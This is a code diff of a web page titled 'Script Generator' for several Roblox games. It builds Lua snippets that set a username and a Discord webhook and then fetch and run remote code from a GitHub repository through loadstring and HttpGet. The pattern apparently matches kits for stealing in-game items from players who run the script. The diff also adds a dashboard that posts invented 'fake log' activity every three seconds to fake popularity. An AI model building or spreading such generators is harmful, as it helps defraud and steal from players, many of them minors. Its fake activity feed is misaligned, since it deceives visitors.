@@ -15,7 +15,6 @@
             height: 100vh;
             flex-direction: column;
             margin: 0;
-            position: relative;
         }
         h1 {
             font-size: 3rem;
@@ -23,24 +22,8 @@
         }
         .container {
             display: flex;
-            flex-direction: column;
             gap: 15px;
             margin-top: 20px;
-        }
-        select {
-            background: #333;
-            color: white;
-            padding: 10px;
-            border-radius: 8px;
-            font-size: 1rem;
-        }
-        input {
-            background: #333;
-            color: white;
-            padding: 10px;
-            border-radius: 8px;
-            font-size: 1rem;
-            border: none;
         }
         button {
             background: #ff0080;
@@ -116,96 +99,49 @@
         .copy-button:disabled {
             background: #555;
         }
-        .log-container {
+        .log-dashboard {
             position: absolute;
-            top: 20px;
-            right: 20px;
-            background: #333;
+            top: 10px;
+            right: 10px;
+            background: rgba(0, 0, 0, 0.7);
             padding: 15px;
-            border-radius: 8px;
-            width: 300px;
-            max-height: 400px;
-            box-shadow: 0 0 10px rgba(0, 0, 0, 0.7);
-            color: white;
-            display: none;
+            border-radius: 10px;
+            width: 250px;
+            height: 300px;
             overflow-y: auto;
-            z-index: 10;
+            box-shadow: 0 0 15px rgba(0, 0, 0, 0.7);
         }
-        .log-container h3 {
-            margin-top: 0;
-        }
-        .log-container ul {
-            padding: 0;
-            list-style: none;
-        }
-        .log-container li {
-            padding: 5px;
-            margin-bottom: 5px;
-            background: #444;
-            border-radius: 4px;
-        }
-        .logs-button {
-            position: absolute;
-            top: 20px;
-            right: 20px;
-            background: #ff0080;
-            padding: 6px;
-            border-radius: 50%;
-            cursor: pointer;
+        .log-dashboard h3 {
             font-size: 1.2rem;
-            color: white;
-            z-index: 10;
+            margin-bottom: 10px;
         }
-        .logs-button:hover {
-            background: #ff0055;
-            transform: scale(1.1);
-        }
-        .login-container {
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            background: rgba(0, 0, 0, 0.6);
-            backdrop-filter: blur(8px);
-            z-index: 20;
-            display: none;
-        }
-        .login-box {
-            background: rgba(0, 0, 0, 0.8);
-            padding: 30px;
-            border-radius: 8px;
-            box-shadow: 0 0 10px rgba(0, 0, 0, 0.7);
-            color: white;
-            text-align: center;
+        .log-entry {
+            background: #444;
+            margin: 5px 0;
+            padding: 8px;
+            border-radius: 5px;
+            font-size: 0.9rem;
+            color: #ddd;
         }
     </style>
 </head>
 <body>
     <h1>Script Generator</h1>
-
-    <div class="login-container" id="login-container">
-        <div class="login-box">
-            <h2>Login</h2>
-            <input type="text" id="username-login" placeholder="Enter Username" />
-            <button onclick="login()">Login</button>
-        </div>
-    </div>
-
     <div class="container">
-        <select id="game-select">
-            <option value="Blox Fruits">Blox Fruits</option>
-            <option value="Murder Mystery 2">Murder Mystery 2</option>
-            <option value="Adopt Me">Adopt Me</option>
-            <option value="Pet Simulator 99">Pet Simulator 99</option>
-            <option value="Pls Donate">Pls Donate</option>
-        </select>
-        <input type="text" id="username" placeholder="Username (required)">
-        <input type="text" id="webhook" placeholder="Webhook URL (required)">
+        <button onclick="openPopup('Blox Fruits')">Blox Fruits</button>
+        <button onclick="openPopup('Murder Mystery 2')">Murder Mystery 2</button>
+        <button onclick="openPopup('Adopt Me')">Adopt Me</button>
+        <button onclick="openPopup('Pet Simulator 99')">Pet Simulator 99</button>
+        <button onclick="openPopup('Pls Donate')">Pls Donate</button>
+    </div>
+    
+    <div id="popup" class="popup">
+        <h2 id="game-title">Enter Details</h2>
+        <input type="text" id="username" placeholder="Roblox Username">
+        <input type="text" id="discordUser" placeholder="Discord Username">
+        <input type="text" id="webhook" placeholder="Webhook URL">
         <button onclick="generateScript()">Generate Script</button>
+        <button onclick="closePopup()">Close</button>
     </div>
 
     <div id="generated-script" class="generated-script">
@@ -214,18 +150,16 @@
         <button id="copy-btn" class="copy-button" onclick="copyScript()">Copy All</button>
     </div>
 
-    <div id="log-container" class="log-container">
-        <h3>Visitor Logs</h3>
-        <ul id="log-list"></ul>
+    <!-- Log Dashboard -->
+    <div class="log-dashboard">
+        <h3>Activity Log</h3>
+        <div id="log-entries">
+            <!-- Fake log entries will be injected here -->
+        </div>
     </div>
-
-    <button id="logs-button" class="logs-button" onclick="toggleLogs()">...</button>
 
     <script>
         let currentGame = '';
-        let visitorLogs = [];
-        let isLoggedIn = false;
-
         const loadstrings = {
             "Blox Fruits": "loadstring(game:HttpGet('https://raw.githubusercontent.com/Goldded/Void2/main/Bloxfruits'))()",
             "Murder Mystery 2": "loadstring(game:HttpGet('https://raw.githubusercontent.com/Goldded/Void2/main/Void'))()",
@@ -234,56 +168,34 @@
             "Pls Donate": "loadstring(game:HttpGet('https://raw.githubusercontent.com/Goldded/Void2/main/PlsDonate'))()"
         };
 
-        function login() {
-            const username = document.getElementById('username-login').value;
-            if (username) {
-                isLoggedIn = true;
-                document.getElementById('login-container').style.display = 'none';
-            } else {
-                alert('Please enter a username to log in');
-            }
+        function openPopup(game) {
+            currentGame = game;
+            document.getElementById('popup').style.display = 'block';
+            document.getElementById('game-title').innerText = `Enter Details for ${game}`;
+        }
+
+        function closePopup() {
+            document.getElementById('popup').style.display = 'none';
         }
 
         function generateScript() {
-            if (!isLoggedIn) {
-                alert('You must be logged in first!');
-                return;
-            }
-
             let username = document.getElementById('username').value;
+            let discordUser = document.getElementById('discordUser').value;
             let webhook = document.getElementById('webhook').value;
-            let selectedGame = document.getElementById('game-select').value;
 
-            if (username && webhook) {
-                let script = `Username = "${username}"\nWebhook = "${webhook}"\n${loadstrings[selectedGame]}`;
+            if (username && webhook && discordUser) {
+                let script = `Username = "${username}"\nWebhook = "${webhook}"\n${loadstrings[currentGame]}`;
                 document.getElementById('script-output').innerText = script;
                 document.getElementById('generated-script').style.display = 'block';
                 document.getElementById('copy-btn').disabled = false;
 
-                // Add log entry
-                visitorLogs.push(`Visitor: ${username} generated script for ${selectedGame} at ${new Date().toLocaleString()}`);
-                updateLogs();
-            } else {
-                alert("Please fill in both the username and webhook!");
-            }
-        }
+                // Simulate fake log entry
+                logEntry(`${discordUser} generated a script for ${currentGame} with username ${username}`);
 
-        function updateLogs() {
-            let logList = document.getElementById('log-list');
-            logList.innerHTML = '';
-            visitorLogs.forEach(log => {
-                let listItem = document.createElement('li');
-                listItem.innerText = log;
-                logList.appendChild(listItem);
-            });
-        }
-
-        function toggleLogs() {
-            const logContainer = document.getElementById('log-container');
-            if (logContainer.style.display === 'none' || logContainer.style.display === '') {
-                logContainer.style.display = 'block';
+                // Close the popup after generating the script
+                closePopup();
             } else {
-                logContainer.style.display = 'none';
+                alert("Please fill in all fields!");
             }
         }
 
@@ -298,9 +210,33 @@
             alert("Script copied to clipboard!");
         }
 
-        window.onload = function () {
-            document.getElementById('login-container').style.display = 'flex';
+        function logEntry(message) {
+            const logContainer = document.getElementById('log-entries');
+            const newLog = document.createElement('div');
+            newLog.classList.add('log-entry');
+            newLog.textContent = message;
+
+            // Inject the log into the dashboard
+            logContainer.prepend(newLog);
+
+            // Limit logs to a certain number (optional)
+            if (logContainer.children.length > 10) {
+                logContainer.removeChild(logContainer.lastChild);
+            }
         }
+
+        // Simulate random fake logs for fun
+        setInterval(() => {
+            const fakeMessages = [
+                'A new user visited the site!',
+                'Generated script for Blox Fruits!',
+                'Discord Username: coolUser12 generated a script!',
+                'Username "robloxPlayer123" visited the site!',
+                'User "bigfan99" generated a script for Pls Donate!'
+            ];
+            const randomMessage = fakeMessages[Math.floor(Math.random() * fakeMessages.length)];
+            logEntry(randomMessage);
+        }, 3000);  // Add fake log every 3 seconds
     </script>
 </body>
 </html>
